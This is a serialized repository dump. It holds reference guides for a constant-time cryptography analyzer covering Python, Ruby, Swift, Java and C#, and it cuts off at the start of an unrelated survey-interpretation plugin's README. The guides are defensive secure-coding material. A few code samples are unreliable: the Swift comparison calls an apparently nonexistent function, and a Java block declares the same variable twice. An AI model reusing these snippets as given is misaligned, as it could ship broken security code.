2>&1\n```\n\nOPcache provides less detailed output than VLD but still detects division/modulo opcodes.\n",
        "plugins/constant-time-analysis/skills/constant-time-analysis/references/python.md": "# Constant-Time Analysis: Python\n\nAnalysis guidance for Python scripts. Uses the `dis` module to analyze CPython bytecode for timing-unsafe operations.\n\n## Prerequisites\n\n- Python 3.10+ (bytecode format varies by version)\n\n## Running the Analyzer\n\n```bash\n# Analyze Python file\nuv run {baseDir}/ct_analyzer/analyzer.py crypto.py\n\n# Include warning-level violations\nuv run {baseDir}/ct_analyzer/analyzer.py --warnings crypto.py\n\n# Filter to specific functions\nuv run {baseDir}/ct_analyzer/analyzer.py --func 'encrypt|sign' crypto.py\n\n# JSON output for CI\nuv run {baseDir}/ct_analyzer/analyzer.py --json crypto.py\n```\n\n## Dangerous Operations\n\n### Bytecodes (Errors)\n\n**Python < 3.11:**\n\n| Bytecode | Issue |\n|----------|-------|\n| BINARY_TRUE_DIVIDE | Variable-time execution |\n| BINARY_FLOOR_DIVIDE | Variable-time execution |\n| BINARY_MODULO | Variable-time execution |\n| INPLACE_TRUE_DIVIDE | Variable-time execution |\n| INPLACE_FLOOR_DIVIDE | Variable-time execution |\n| INPLACE_MODULO | Variable-time execution |\n\n**Python 3.11+:**\n\n| BINARY_OP Oparg | Operation | Issue |\n|-----------------|-----------|-------|\n| 11 | `/` | Variable-time execution |\n| 12 | `//` | Variable-time execution |\n| 6 | `%` | Variable-time execution |\n| 24 | `/=` | Variable-time execution |\n| 25 | `//=` | Variable-time execution |\n| 19 | `%=` | Variable-time execution |\n\n### Functions (Errors)\n\n| Function | Issue | Safe Alternative |\n|----------|-------|------------------|\n| `random.random()` | Predictable | `secrets.token_bytes()` |\n| `random.randint()` | Predictable | `secrets.randbelow()` |\n| `random.randrange()` | Predictable | `secrets.randbelow()` |\n| `random.choice()` | Predictable | `secrets.choice()` |\n| `random.shuffle()` | Predictable | Custom with `secrets` |\n| `random.sample()` | Predictable | Custom with `secrets` |\n| `math.sqrt()` | Variable latency | Avoid in crypto |\n| `math.pow()` | Variable latency | Avoid in crypto |\n| `eval()` | Unpredictable timing | Avoid entirely |\n| `exec()` | Unpredictable timing | Avoid entirely |\n\n### Functions (Warnings)\n\n| Function | Issue | Safe Alternative |\n|----------|-------|------------------|\n| `str.find()` | Early-terminating | Constant-time search |\n| `str.index()` | Early-terminating | Constant-time search |\n| `str.startswith()` | Early-terminating | `hmac.compare_digest()` |\n| `str.endswith()` | Early-terminating | `hmac.compare_digest()` |\n| `in` (strings) | Early-terminating | Constant-time search |\n| `json.dumps()` | Variable-length output | Fixed-length padding |\n| `json.loads()` | Variable-time | Fixed-length input |\n| `base64.b64encode()` | Variable-length output | Fixed-length padding |\n| `pickle.dumps()` | Variable-length output | Avoid for secrets |\n| `pickle.loads()` | Variable-time, security risk | Avoid for secrets |\n\n## Safe Patterns\n\n### String Comparison\n\n```python\n# VULNERABLE: Early exit on mismatch\nif user_token == stored_token:\n    ...\n\n# SAFE: Constant-time comparison\nimport hmac\nif hmac.compare_digest(user_token, stored_token):\n    ...\n\n# SAFE: For bytes\nimport secrets\nif secrets.compare_digest(user_bytes, stored_bytes):\n    ...\n```\n\n### Random Number Generation\n\n```python\n# VULNERABLE: Predictable\nimport random\ntoken = random.randint(0, 2**128)\n\n# SAFE: Cryptographically secure\nimport secrets\ntoken = secrets.token_bytes(16)\ntoken_int = secrets.randbits(128)\nrandom_index = secrets.randbelow(len(items))\n```\n\n### Division Operations\n\n```python\n# VULNERABLE: Division has variable timing\nquotient = secret // divisor\n\n# SAFE: Barrett reduction for constant divisors\n# Precompute: mu = (1 << (2 * BITS)) // divisor\ndef barrett_reduce(value: int, divisor: int, mu: int, bits: int) -> int:\n    q = (value * mu) >> (2 * bits)\n    r = value - q * divisor\n    # Constant-time correction\n    mask = -(r >= divisor)\n    return r - (divisor & mask)\n```\n\n## Python Version Notes\n\n### Python 3.11+ Changes\n\nPython 3.11 introduced the `BINARY_OP` bytecode that replaces individual binary operation bytecodes. The analyzer detects division/modulo by checking the oparg:\n\n```\nBINARY_OP               11 (/)    # True division\nBINARY_OP               12 (//)   # Floor division\nBINARY_OP                6 (%)    # Modulo\n```\n\n### Python 3.10 and Earlier\n\nUses separate bytecodes:\n```\nBINARY_TRUE_DIVIDE\nBINARY_FLOOR_DIVIDE\nBINARY_MODULO\n```\n\n## Cryptography Library Considerations\n\nWhen using the `cryptography` library:\n\n```python\n# The cryptography library handles constant-time internally\nfrom cryptography.hazmat.primitives.ciphers.aead import AESGCM\n\n# SAFE: Library handles timing protection\naesgcm = AESGCM(key)\nciphertext = aesgcm.encrypt(nonce, plaintext, associated_data)\n```\n\nFor custom cryptographic code, ensure you:\n1. Use `hmac.compare_digest()` for comparisons\n2. Use `secrets` module for randomness\n3. Avoid division/modulo on secret-derived values\n4. Use fixed-length data representations\n\n## Limitations\n\n### CPython Bytecode Only\n\nThe analyzer targets CPython bytecode. Alternative implementations (PyPy, Jython, etc.) have different bytecode formats and timing characteristics.\n\n### JIT Compilation\n\nPyPy and Numba can JIT-compile Python to native code with potentially different timing behavior. Consider additional analysis for JIT-compiled code paths.\n",
        "plugins/constant-time-analysis/skills/constant-time-analysis/references/ruby.md": "# Constant-Time Analysis: Ruby\n\nAnalysis guidance for Ruby scripts. Uses YARV (Yet Another Ruby VM) instruction sequence dump to analyze bytecode for timing-unsafe operations.\n\n## Prerequisites\n\n- Ruby 2.0+ (uses `ruby --dump=insns`)\n\n## Running the Analyzer\n\n```bash\n# Analyze Ruby file\nuv run {baseDir}/ct_analyzer/analyzer.py crypto.rb\n\n# Include warning-level violations\nuv run {baseDir}/ct_analyzer/analyzer.py --warnings crypto.rb\n\n# Filter to specific functions\nuv run {baseDir}/ct_analyzer/analyzer.py --func 'encrypt|sign' crypto.rb\n\n# JSON output for CI\nuv run {baseDir}/ct_analyzer/analyzer.py --json crypto.rb\n```\n\n## Dangerous Operations\n\n### Bytecodes (Errors)\n\n| Bytecode | Issue |\n|----------|-------|\n| opt_div | Variable-time execution based on operand values |\n| opt_mod | Variable-time execution based on operand values |\n\n### Bytecodes (Warnings)\n\n| Bytecode | Issue |\n|----------|-------|\n| opt_eq | May early-terminate on secret data |\n| opt_neq | May early-terminate on secret data |\n| opt_lt, opt_le, opt_gt, opt_ge | Comparison may leak timing |\n| branchif, branchunless | Conditional branch on secrets |\n| opt_aref | Array access may leak timing via cache |\n| opt_aset | Array store may leak timing via cache |\n| opt_lshift, opt_rshift | Bit shift timing may vary |\n\n### Functions (Errors)\n\n| Function | Issue | Safe Alternative |\n|----------|-------|------------------|\n| `rand()` | Predictable | `SecureRandom.random_bytes()` |\n| `Random.new` | Predictable | `SecureRandom` |\n| `srand()` | Sets predictable seed | `SecureRandom` |\n| `Math.sqrt()` | Variable latency | Avoid in crypto |\n\n### Functions (Warnings)\n\n| Function | Issue | Safe Alternative |\n|----------|-------|------------------|\n| `include?()` | Early-terminating | Constant-time search |\n| `index()` | Early-terminating | Constant-time search |\n| `start_with?()` | Early-terminating | `Rack::Utils.secure_compare()` |\n| `end_with?()` | Early-terminating | `Rack::Utils.secure_compare()` |\n| `match()` | Variable-time | Avoid on secrets |\n| `=~` | Variable-time regex | Avoid on secrets |\n| `to_json()` | Variable-length output | Fixed-length padding |\n| `Marshal.dump()` | Variable-length output | Avoid for secrets |\n| `Marshal.load()` | Variable-time, security risk | Avoid for secrets |\n\n## Safe Patterns\n\n### String Comparison\n\n```ruby\n# VULNERABLE: Early exit on mismatch\nif user_token == stored_token\n  # ...\nend\n\n# SAFE: Constant-time comparison (Rails/Rack)\nrequire 'rack/utils'\nif Rack::Utils.secure_compare(user_token, stored_token)\n  # ...\nend\n\n# SAFE: ActiveSupport (Rails)\nrequire 'active_support/security_utils'\nif ActiveSupport::SecurityUtils.secure_compare(user_token, stored_token)\n  # ...\nend\n\n# SAFE: OpenSSL (stdlib)\nrequire 'openssl'\nif OpenSSL.secure_compare(user_token, stored_token)\n  # ...\nend\n```\n\n### Random Number Generation\n\n```ruby\n# VULNERABLE: Predictable\ntoken = rand(2**128)\nrandom_bytes = Random.new.bytes(16)\n\n# SAFE: Cryptographically secure\nrequire 'securerandom'\ntoken = SecureRandom.random_bytes(16)\ntoken_hex = SecureRandom.hex(16)\ntoken_base64 = SecureRandom.base64(16)\nrandom_number = SecureRandom.random_number(2**128)\n```\n\n### Division Operations\n\n```ruby\n# VULNERABLE: Division has variable timing\nquotient = secret / divisor\n\n# SAFE: Barrett reduction for constant divisors\ndef barrett_reduce(value, divisor, mu, bits)\n  q = (value * mu) >> (2 * bits)\n  r = value - q * divisor\n  # Constant-time correction using bitwise operations\n  mask = -(r >= divisor ? 1 : 0)\n  r - (divisor & mask)\nend\n```\n\n## Rails/Rack Integration\n\n### Secure Compare\n\nRails and Rack provide constant-time comparison:\n\n```ruby\n# Rack (standalone)\nRack::Utils.secure_compare(a, b)\n\n# Rails/ActiveSupport\nActiveSupport::SecurityUtils.secure_compare(a, b)\n\n# OpenSSL (Ruby 2.5+)\nOpenSSL.secure_compare(a, b)\n```\n\n### CSRF Token Comparison\n\n```ruby\n# Rails automatically uses secure_compare for CSRF tokens\n# For custom token validation:\nclass ApplicationController < ActionController::Base\n  def verify_api_token\n    provided = request.headers['X-API-Token']\n    expected = current_user.api_token\n\n    # SAFE: Constant-time comparison\n    unless ActiveSupport::SecurityUtils.secure_compare(provided, expected)\n      head :unauthorized\n    end\n  end\nend\n```\n\n## YARV Bytecode Notes\n\nThe analyzer uses `ruby --dump=insns` to get YARV instruction sequences. Example output:\n\n```\n== disasm: #<ISeq:vulnerable_function@test.rb:1 (1,0)-(5,3)>\nlocal table (size: 2, argc: 2)\n[ 2] value@0    [ 1] modulus@1\n0000 getlocal_WC_0     value@0\n0002 getlocal_WC_0     modulus@1\n0004 opt_div           <calldata!mid:/, argc:1>\n0006 leave\n```\n\nThe `opt_div` instruction at offset 0004 is flagged as a timing vulnerability.\n\n## Limitations\n\n### MRI Ruby Only\n\nThe analyzer targets MRI (Matz's Ruby Interpreter) YARV bytecode. Alternative implementations (JRuby, TruffleRuby) have different bytecode formats:\n\n- **JRuby**: Compiles to JVM bytecode\n- **TruffleRuby**: Uses GraalVM intermediate representation\n\n### Method Caching\n\nRuby's method dispatch involves caching that can affect timing. Even with constant-time operations, method lookup timing may leak information about code paths.\n\n### Gem Dependencies\n\nWhen auditing gems:\n1. Check if the gem uses `SecureRandom` instead of `rand`\n2. Verify string comparisons use `secure_compare`\n3. Look for division/modulo operations on sensitive data\n",
        "plugins/constant-time-analysis/skills/constant-time-analysis/references/swift.md": "# Constant-Time Analysis: Swift\n\nAnalysis guidance for Swift targeting iOS, macOS, watchOS, and tvOS. Swift compiles to native code, making it subject to the same CPU-level timing side-channels as C, C++, Go, and Rust.\n\n## Understanding Swift Compilation\n\nSwift compiles directly to native machine code:\n\n```text\nSource Code (.swift)\n        |\n        v\n    swiftc (Swift Compiler / LLVM)\n        |\n        v\n   Native Assembly\n        |\n        v\n   Machine Code (binary)\n```\n\n**Key implications:**\n\n1. **Same vulnerabilities as C** - Division, branches, and table lookups have data-dependent timing\n2. **LLVM backend** - Swift uses LLVM, so analysis is similar to clang-compiled code\n3. **Architecture matters** - x86_64 (Mac) and arm64 (iOS devices, Apple Silicon) have different instruction sets\n\n## Running the Analyzer\n\n```bash\n# Analyze Swift for native architecture\nuv run {baseDir}/ct_analyzer/analyzer.py crypto.swift\n\n# Analyze for iOS device (arm64)\nuv run {baseDir}/ct_analyzer/analyzer.py --arch arm64 crypto.swift\n\n# Analyze for Intel Mac\nuv run {baseDir}/ct_analyzer/analyzer.py --arch x86_64 crypto.swift\n\n# Test multiple optimization levels (RECOMMENDED)\nuv run {baseDir}/ct_analyzer/analyzer.py --opt-level O0 crypto.swift\nuv run {baseDir}/ct_analyzer/analyzer.py --opt-level O2 crypto.swift\n\n# Include conditional branch warnings\nuv run {baseDir}/ct_analyzer/analyzer.py --warnings crypto.swift\n\n# CI-friendly JSON output\nuv run {baseDir}/ct_analyzer/analyzer.py --json crypto.swift\n```\n\n## Dangerous Instructions by Architecture\n\n### ARM64 (iOS devices, Apple Silicon Macs)\n\n| Category | Instructions | Risk |\n|----------|--------------|------|\n| Division | `UDIV`, `SDIV` | Early termination optimization; variable-time |\n| Floating-Point | `FDIV`, `FSQRT` | Variable latency based on operand values |\n| Conditional Branches | `B.EQ`, `B.NE`, `CBZ`, `CBNZ`, etc. | Timing leak if condition depends on secrets |\n\n### x86_64 (Intel Macs)\n\n| Category | Instructions | Risk |\n|----------|--------------|------|\n| Division | `DIV`, `IDIV`, `DIVQ`, `IDIVQ` | Data-dependent timing |\n| Floating-Point | `DIVSS`, `DIVSD`, `SQRTSS`, `SQRTSD` | Variable latency |\n| Conditional Branches | `JE`, `JNE`, `JZ`, `JNZ`, etc. | Timing leak if condition depends on secrets |\n\n## Constant-Time Patterns\n\n### Replace Division\n\n```swift\n// VULNERABLE: Division instruction emitted\nlet q = secretValue / divisor\n\n// SAFE: Barrett reduction (for fixed divisor)\n// Precompute: mu = (1 << 32) / divisor\nlet mu: UInt64 = (1 << 32) / UInt64(divisor)\nlet q = Int32((UInt64(secretValue) &* mu) >> 32)\n```\n\n### Replace Branches\n\n```swift\n// VULNERABLE: Branch timing reveals secret\nlet result = secret != 0 ? a : b\n\n// SAFE: Constant-time selection using bitwise ops\nlet mask = Int32(bitPattern: UInt32(bitPattern: -Int32(secret != 0 ? 1 : 0)))\n// Better approach with no branch:\nlet nonZero = (secret | -secret) >> 31  // -1 if secret != 0, else 0\nlet result = (a & nonZero) | (b & ~nonZero)\n```\n\n### Replace Comparisons\n\n```swift\n// VULNERABLE: Standard equality may early-terminate\nif computed == expected { ... }\n\n// SAFE: Constant-time comparison\nimport CryptoKit  // Available on iOS 13+, macOS 10.15+\n\n// Use Data's built-in constant-time comparison for crypto\nif computed.withUnsafeBytes({ cPtr in\n    expected.withUnsafeBytes { ePtr in\n        timingSafeCompare(cPtr, ePtr)\n    }\n}) { ... }\n\n// Manual constant-time comparison\nfunc constantTimeCompare(_ a: [UInt8], _ b: [UInt8]) -> Bool {\n    guard a.count == b.count else { return false }\n    var result: UInt8 = 0\n    for i in 0..<a.count {\n        result |= a[i] ^ b[i]\n    }\n    return result == 0\n}\n```\n\n### Secure Random\n\n```swift\n// VULNERABLE: Don't use for cryptographic purposes\nimport Foundation\nlet value = Int.random(in: 0..<100)  // Uses arc4random, generally OK but not verified\n\n// SAFE: Use CryptoKit (iOS 13+, macOS 10.15+)\nimport CryptoKit\n\n// Generate secure random bytes\nvar randomBytes = [UInt8](repeating: 0, count: 32)\nlet status = SecRandomCopyBytes(kSecRandomDefault, randomBytes.count, &randomBytes)\nguard status == errSecSuccess else { /* handle error */ }\n\n// Or use SymmetricKey for key generation\nlet key = SymmetricKey(size: .bits256)\n```\n\n## Apple Platform Considerations\n\n### Using CryptoKit (Recommended)\n\nCryptoKit provides constant-time implementations for common operations:\n\n```swift\nimport CryptoKit\n\n// HMAC (constant-time internally)\nlet key = SymmetricKey(size: .bits256)\nlet signature = HMAC<SHA256>.authenticationCode(for: data, using: key)\n\n// AES-GCM encryption\nlet sealedBox = try AES.GCM.seal(plaintext, using: key)\n\n// Curve25519 key agreement\nlet privateKey = Curve25519.KeyAgreement.PrivateKey()\nlet sharedSecret = try privateKey.sharedSecretFromKeyAgreement(with: peerPublicKey)\n```\n\n### Security Framework\n\n```swift\nimport Security\n\n// Generate cryptographically secure random data\nfunc secureRandomBytes(count: Int) -> Data? {\n    var bytes = [UInt8](repeating: 0, count: count)\n    let status = SecRandomCopyBytes(kSecRandomDefault, count, &bytes)\n    return status == errSecSuccess ? Data(bytes) : nil\n}\n\n// Keychain for secure storage\nfunc storeInKeychain(key: Data, account: String) -> Bool {\n    let query: [String: Any] = [\n        kSecClass as String: kSecClassGenericPassword,\n        kSecAttrAccount as String: account,\n        kSecValueData as String: key\n    ]\n    return SecItemAdd(query as CFDictionary, nil) == errSecSuccess\n}\n```\n\n## Swift-Specific Pitfalls\n\n### Optional Unwrapping\n\n```swift\n// Branching on optionals\nif let secret = maybeSecret {  // Introduces branch\n    process(secret)\n}\n\n// Guard statements also branch\nguard let secret = maybeSecret else { return }\n```\n\n### Pattern Matching\n\n```swift\n// Switch/case compiles to branching code\nswitch secretEnum {\ncase .optionA: handleA()  // Branch\ncase .optionB: handleB()  // Branch\n}\n```\n\n### Array Subscripting\n\n```swift\n// Array access indexed by secret leaks via cache timing\nlet value = lookupTable[secretIndex]  // Cache timing side-channel\n```\n\n### String Operations\n\n```swift\n// String comparison is NOT constant-time\nif secretString == expectedString { ... }  // Variable-time\n\n// Character iteration may also have timing variations\nfor char in secretString { ... }\n```\n\n## Setup Requirements\n\n### Xcode (Recommended)\n\nInstall Xcode from the Mac App Store. The Swift compiler is included.\n\n```bash\n# Verify installation\nswiftc --version\n```\n\n### Swift Toolchain (Alternative)\n\nDownload from [swift.org](https://swift.org/download/) for standalone installation.\n\n```bash\n# Verify\nswiftc --version\n```\n\n### Cross-Compilation\n\nFor analyzing code targeting different architectures:\n\n```bash\n# Analyze for iOS device\nuv run {baseDir}/ct_analyzer/analyzer.py --arch arm64 crypto.swift\n\n# Analyze for iOS simulator\nuv run {baseDir}/ct_analyzer/analyzer.py --arch x86_64 crypto.swift\n```\n\n## Common Mistakes\n\n1. **Using Swift's == for byte comparison** - Standard equality comparison may early-terminate; use constant-time comparison\n\n2. **Trusting CryptoKit for all operations** - CryptoKit provides constant-time primitives, but combining them incorrectly can introduce vulnerabilities\n\n3. **String manipulation on secrets** - Swift strings have complex internal representations; timing varies with content\n\n4. **Ignoring optimization levels** - Swift's optimizer can transform safe source code into unsafe assembly; test at multiple -O levels\n\n5. **Platform availability** - CryptoKit requires iOS 13+/macOS 10.15+; older platforms need alternative implementations\n\n## Testing on Different Architectures\n\nAlways test your cryptographic code on actual target architectures:\n\n```bash\n# Apple Silicon Mac (arm64)\nuv run {baseDir}/ct_analyzer/analyzer.py crypto.swift\n\n# Cross-compile for Intel\nuv run {baseDir}/ct_analyzer/analyzer.py --arch x86_64 crypto.swift\n```\n\n## Further Reading\n\n- [Apple CryptoKit Documentation](https://developer.apple.com/documentation/cryptokit)\n- [Apple Security Framework](https://developer.apple.com/documentation/security)\n- [Swift.org Security](https://swift.org/blog/swift-5-release/)\n- [OWASP iOS Security Guide](https://owasp.org/www-project-mobile-security-testing-guide/)\n",
        "plugins/constant-time-analysis/skills/constant-time-analysis/references/vm-compiled.md": "# Constant-Time Analysis: VM-Compiled Languages\n\nAnalysis guidance for Java and C#. These languages compile to bytecode (JVM bytecode / CIL) that runs on a virtual machine with Just-In-Time (JIT) compilation to native code.\n\n## Understanding VM-Compiled Languages\n\nUnlike native-compiled languages (C, Rust, Go), Java and C# add an intermediate layer:\n\n```text\nSource Code (.java/.cs)\n        |\n        v\n    Compiler (javac/csc)\n        |\n        v\nBytecode (.class/.dll)\n        |\n        v\n    JIT Compiler (HotSpot/RyuJIT)\n        |\n        v\n   Native Code (at runtime)\n```\n\n**Security implications:**\n\n1. **Bytecode is deterministic** - Same source always produces same bytecode\n2. **JIT is non-deterministic** - Native code varies by runtime, version, and warmup state\n3. **Analysis target** - We analyze bytecode since JIT output is impractical to capture\n\n**Limitations:**\n\n- JIT may introduce timing variations not visible in bytecode\n- Runtime optimizations can convert safe bytecode to unsafe native code\n- Different JVM/CLR implementations may behave differently\n\n## Running the Analyzer\n\n```bash\n# Java\nuv run {baseDir}/ct_analyzer/analyzer.py CryptoUtils.java\n\n# C#\nuv run {baseDir}/ct_analyzer/analyzer.py CryptoUtils.cs\n\n# Include conditional branch warnings\nuv run {baseDir}/ct_analyzer/analyzer.py --warnings CryptoUtils.java\n\n# Filter to specific methods\nuv run {baseDir}/ct_analyzer/analyzer.py --func 'sign|verify' CryptoUtils.java\n\n# CI-friendly JSON output\nuv run {baseDir}/ct_analyzer/analyzer.py --json CryptoUtils.java\n```\n\nNote: The `--arch` and `--opt-level` flags do not apply to VM-compiled languages.\n\n## Dangerous Bytecode Instructions\n\n### JVM Bytecode\n\n| Category | Instructions | Risk |\n|----------|--------------|------|\n| Integer Division | `idiv`, `ldiv`, `irem`, `lrem` | Variable-time based on operand values |\n| Floating Division | `fdiv`, `ddiv`, `frem`, `drem` | Variable latency |\n| Conditional Branches | `ifeq`, `ifne`, `iflt`, `ifge`, `ifgt`, `ifle`, `if_icmp*`, `if_acmp*` | Timing leak if condition depends on secrets |\n| Table Lookups | `*aload`, `*astore`, `tableswitch`, `lookupswitch` | Cache timing if index depends on secrets |\n\n### CIL (C# / .NET)\n\n| Category | Instructions | Risk |\n|----------|--------------|------|\n| Integer Division | `div`, `div.un`, `rem`, `rem.un` | Variable-time based on operand values |\n| Floating Division | (uses same `div`/`rem` opcodes) | Variable latency |\n| Conditional Branches | `beq`, `bne`, `blt`, `bgt`, `ble`, `bge`, `brfalse`, `brtrue` | Timing leak if condition depends on secrets |\n| Table Lookups | `ldelem.*`, `stelem.*`, `switch` | Cache timing if index depends on secrets |\n\n## Constant-Time Patterns\n\n### Java\n\n#### Replace Division\n\n```java\n// VULNERABLE: Division instruction emitted\nint q = secretValue / divisor;\n\n// SAFE: Barrett reduction (for fixed divisor)\n// Precompute: mu = (1L << 32) / divisor\nlong mu = 0x100000000L / divisor;\nint q = (int) ((secretValue * mu) >>> 32);\n```\n\n#### Replace Branches\n\n```java\n// VULNERABLE: Branch timing reveals secret\nint result;\nif (secret != 0) {\n    result = a;\n} else {\n    result = b;\n}\n\n// SAFE: Constant-time selection using bitwise ops\nint mask = -(secret != 0 ? 1 : 0);  // All 1s if true, all 0s if false\n// Better: compute mask without branch\nint mask = (secret | -secret) >> 31;  // -1 if secret != 0, else 0\nint result = (a & mask) | (b & ~mask);\n```\n\n#### Replace Comparisons\n\n```java\n// VULNERABLE: Arrays.equals() may early-terminate\nif (Arrays.equals(computed, expected)) { ... }\n\n// SAFE: Use MessageDigest.isEqual() for constant-time comparison\nimport java.security.MessageDigest;\nif (MessageDigest.isEqual(computed, expected)) { ... }\n```\n\n#### Secure Random\n\n```java\n// VULNERABLE: Predictable PRNG\nRandom rand = new Random();\nint value = rand.nextInt();\n\n// SAFE: Cryptographically secure\nSecureRandom secureRand = new SecureRandom();\nint value = secureRand.nextInt();\n```\n\n### C# / .NET\n\n#### Replace Division\n\n```csharp\n// VULNERABLE: Division instruction emitted\nint q = secretValue / divisor;\n\n// SAFE: Barrett reduction (for fixed divisor)\n// Precompute: mu = (1UL << 32) / divisor\nulong mu = 0x100000000UL / (ulong)divisor;\nint q = (int)((secretValue * mu) >> 32);\n```\n\n#### Replace Branches\n\n```csharp\n// VULNERABLE: Branch timing reveals secret\nint result = secret != 0 ? a : b;\n\n// SAFE: Constant-time selection\nint mask = -(secret != 0 ? 1 : 0);\nint result = (a & mask) | (b & ~mask);\n\n// Or use Vector<T> for SIMD constant-time ops (.NET 7+)\n```\n\n#### Replace Comparisons\n\n```csharp\n// VULNERABLE: SequenceEqual may early-terminate\nif (computed.SequenceEqual(expected)) { ... }\n\n// SAFE: Use CryptographicOperations.FixedTimeEquals (.NET Core 2.1+)\nusing System.Security.Cryptography;\nif (CryptographicOperations.FixedTimeEquals(computed, expected)) { ... }\n```\n\n#### Secure Random\n\n```csharp\n// VULNERABLE: Predictable PRNG\nRandom rand = new Random();\nint value = rand.Next();\n\n// SAFE: Cryptographically secure\nusing System.Security.Cryptography;\nint value = RandomNumberGenerator.GetInt32(int.MaxValue);\n// Or for bytes:\nbyte[] bytes = RandomNumberGenerator.GetBytes(32);\n```\n\n## Platform-Specific Considerations\n\n### Java\n\n- **Bouncy Castle**: Use `org.bouncycastle.util.Arrays.constantTimeAreEqual()` for constant-time comparison\n- **JEP 329 (Java 12+)**: ChaCha20 and Poly1305 implementations are designed to be constant-time\n- **BigInteger**: Operations like `modPow()` may have timing leaks; consider using Bouncy Castle's constant-time implementations\n\n### C# / .NET\n\n- **Span<T>**: Use `CryptographicOperations.FixedTimeEquals(ReadOnlySpan<byte>, ReadOnlySpan<byte>)` for best performance\n- **NSec**: Consider using NSec library for constant-time cryptographic primitives\n- **BigInteger**: .NET's BigInteger has potential timing leaks; use specialized crypto libraries\n\n## JIT Compiler Caveats\n\nEven if bytecode appears safe, JIT compilers can introduce timing vulnerabilities:\n\n1. **Speculative optimization** - JIT may convert constant-time bytecode to branching native code\n2. **Escape analysis** - May inline and optimize in ways that introduce timing\n3. **Tiered compilation** - Code behavior may change as it \"warms up\"\n\n**Mitigations:**\n\n- Test with production JVM/CLR versions\n- Consider ahead-of-time (AOT) compilation (GraalVM Native Image, .NET Native AOT)\n- For critical code, verify native code output with JIT logging:\n\n```bash\n# Java: Print JIT compilation\njava -XX:+PrintCompilation -XX:+UnlockDiagnosticVMOptions -XX:+PrintAssembly MyClass\n\n# .NET: Enable tiered compilation diagnostics\nDOTNET_TieredCompilation=0 dotnet run  # Disable tiered compilation for consistent behavior\n```\n\n## Setup Requirements\n\n### Java\n\n**Required:** JDK 8+ with `javac` and `javap` available.\n\n**Installation:**\n\n```bash\n# macOS (Homebrew)\nbrew install openjdk@21\n\n# Ubuntu/Debian\nsudo apt install openjdk-21-jdk\n\n# Windows (via winget)\nwinget install Microsoft.OpenJDK.21\n```\n\n**PATH Configuration (macOS):**\n\nOn macOS, Homebrew installs OpenJDK as \"keg-only\" (not linked to `/usr/local/bin`). You must add it to your PATH:\n\n```bash\n# Add to ~/.zshrc or ~/.bashrc\nexport PATH=\"/opt/homebrew/opt/openjdk@21/bin:$PATH\"  # Apple Silicon\n# or\nexport PATH=\"/usr/local/opt/openjdk@21/bin:$PATH\"     # Intel Mac\n```\n\n**Verification:**\n\n```bash\njavac --version  # Should show: javac 21.x.x\njavap -version   # Should show version info\n```\n\n**Common Issues:**\n\n- **\"Unable to locate a Java Runtime\"** on macOS: The system `/usr/bin/javac` is a stub that requires a real JDK. Install OpenJDK via Homebrew.\n- **Wrong Java version**: If you have multiple JDKs, use `JAVA_HOME` or ensure the correct one is first in PATH.\n\n### C#\n\n**Required:** .NET SDK 8.0+ with `dotnet` available, plus `ilspycmd` for IL disassembly.\n\n**Installation:**\n\n```bash\n# macOS (Homebrew)\nbrew install dotnet-sdk\n\n# Ubuntu/Debian\nsudo apt install dotnet-sdk-8.0\n\n# Windows\nwinget install Microsoft.DotNet.SDK.8\n```\n\n**Install IL Disassembler:**\n\n```bash\ndotnet tool install -g ilspycmd\n```\n\n**PATH Configuration:**\n\nEnsure the .NET tools directory is in your PATH:\n\n```bash\n# Add to ~/.zshrc or ~/.bashrc\nexport PATH=\"$HOME/.dotnet/tools:$PATH\"\n```\n\n**Verification:**\n\n```bash\ndotnet --version    # Should show: 8.x.x or higher\nilspycmd --version  # Should show: ilspycmd: 9.x.x\n```\n\n**Common Issues:**\n\n- **\"ilspycmd requires .NET 8.0 but you have .NET 10.0\"**: This happens when ilspycmd targets an older .NET version than your installed SDK. The analyzer automatically handles this on macOS by detecting Homebrew's dotnet@8 installation. Install the compatible runtime:\n\n  ```bash\n  # macOS\n  brew install dotnet@8\n\n  # Other platforms: install .NET 8.0 runtime alongside your SDK\n  ```\n\n- **\"IL disassembly tools not found\"**: Ensure `ilspycmd` is installed globally and `~/.dotnet/tools` is in your PATH.\n\n- **Source-only fallback**: If IL disassembly fails, the analyzer falls back to source-level analysis. This still detects division operators and dangerous function calls but misses bytecode-level issues.\n\n### Alternative: Mono (Linux/macOS)\n\nFor environments without .NET SDK, you can use Mono:\n\n```bash\n# macOS\nbrew install mono\n\n# Ubuntu/Debian\nsudo apt install mono-complete\n\n# Verify\nmcs --version\nmonodis --help\n```\n\nNote: Mono's `monodis` produces different IL output than `ilspycmd`. The analyzer supports both formats.\n\n## Common Mistakes\n\n1. **Trusting high-level APIs** - `Arrays.equals()` in Java and `SequenceEqual()` in C# are NOT constant-time\n\n2. **Ignoring JIT behavior** - Bytecode analysis is necessary but not sufficient; JIT can introduce leaks\n\n3. **BigInteger operations** - Both platforms' BigInteger implementations may leak timing; use crypto libraries\n\n4. **String comparisons** - Never compare secrets as strings; use byte arrays with constant-time comparison\n\n5. **Exception timing** - Try/catch blocks around secret operations may leak timing through exception handling\n\n## Further Reading\n\n- [Java Cryptography Architecture Guide](https://docs.oracle.com/en/java/javase/17/security/java-cryptography-architecture-jca-reference-guide.html)\n- [.NET Cryptography Model](https://docs.microsoft.com/en-us/dotnet/standard/security/cryptography-model)\n- [Bouncy Castle Java](https://www.bouncycastle.org/java.html) - Constant-time crypto primitives\n- [NSec](https://nsec.rocks/) - Modern cryptographic library for .NET\n",
        "plugins/culture-index/.claude-plugin/plugin.json": "{\n  \"name\": \"culture-index\",\n  \"version\": \"1.0.0\",\n  \"description\": \"Interprets Culture Index survey results for individuals and teams\",\n  \"author\": {\n    \"name\": \"Dan Guido\"\n  }\n}\n",
        "plugins/culture-index/README.md": "# Culture Index\n\nInterprets Culture Index survey results for individuals and teams.\n\n**Author:** Dan Guido\n\n## When to Use\n\nUse this skill when you need to:\n- Interpret an individual's Culture Index profile\n- Analyze team composition for gas/brake/glue balance\n- Detect burnout signals by comparing Survey vs Job traits\n- Compare multiple profiles for compatibility\n- Get motivator recommendations for specific trait types\n\n## What It Does\n\nThis skill provides expert interpretation of Culture Index behavioral assessments:\n\n- **Relative Interpretation** - Always uses distance from arrow, never absolute values\n- **Survey vs Job Analysis** - Identifies behavior modification and energy drain\n- **Pattern Recognition** - Maps profiles to 19 archetypes\n- **Team Analysis** - Assesses gas/brake/glue balance and gaps\n- **Burnout Detection** - Calculates energy utilization and flags risk\n\n## Installation\n\n```\n/plugin install 